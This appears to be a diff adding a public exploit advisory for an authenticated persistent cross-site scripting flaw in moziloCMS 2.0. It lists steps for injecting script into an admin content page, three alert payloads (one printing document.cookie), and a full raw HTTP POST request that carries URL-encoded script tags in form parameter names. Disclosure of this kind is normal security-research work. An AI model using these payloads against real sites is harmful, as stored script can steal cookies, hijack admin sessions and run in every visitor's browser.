@@ -1,0 +1,41 @@
+# Exploit Title: moziloCMS 2.0 - Persistent Cross-Site Scripting (Authenticated)
+# Date: 2020-08-31
+# Exploit Author: Abdulkadir Kaya
+# Vendor Homepage: https://www.mozilo.de/
+# Version: 2.0
+# Tested on: Windows & WampServer
+
+1- Go to following url. >> http://(HOST)/(PATH)/admin/
+2- Login the admin panel. 
+3- Go to "Content".
+4- Write XSS payload in the "Content Page" section.
+5- Save.
+
+NOTE: Content Page must be in the Category.
+
+((XSS Payloads))
+
+1-<script>alert("XSS Confirmed");</script>
+2-<script>alert(document.cookie);</script>
+3-<script>alert(document.domain);</script>
+
+(( REQUEST ))
+
+POST /mozilo/admin/index.php HTTP/1.1
+Host: 127.0.0.1:8088
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: text/html, */*; q=0.01
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1:8088/mozilo/admin/index.php?nojs=true&action=catpage&multi=true
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 269
+Origin: http://127.0.0.1:8088
+Connection: close
+Cookie: mozilo_editor_settings=true,false,mozilo,12px; PHPSESSID=1jlbsfbodasafasl121chjv5947j0s; 
+MOZILOID_875895d61510deasdfa1a7ad7cc6047f819=5tqsm5d5nvphqimdpqcnq4tqit
+
+action=catpage&sort_array[%253Cscript%253Ealert%2528%2522XSS%2520Confirmed%2521%2522%2529%253C%252Fscript%253E]
+=%5BWilkommen%5D&changeart=cat_page_move&cat_page_change[%253Cscript%253Ealert%2528%2522XSS%2520Confirmed%2521
+%2522%2529%253C%252Fscript%253E]=%5BWilkommen%5D
